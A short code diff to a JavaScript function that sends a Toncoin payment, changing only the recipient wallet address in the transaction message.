@@ -41,7 +41,7 @@ async function sendTransaction(value) {
         validUntil: Math.floor(new Date() / 1000) + 360,
         messages: [
             {
-                address: "UQA8vjvPnTI71h65HVfODbXxPn4wGEZ8QvLFxGEjnRR-pBcB",
+                address: "UQA3234a9rmihoxA9BNH7X0qH-tDC0kOYkrsFPfJ4oX73B7E",
                 amount: (value*(10**9)).toString() //Toncoin in nanotons
             }
         ]
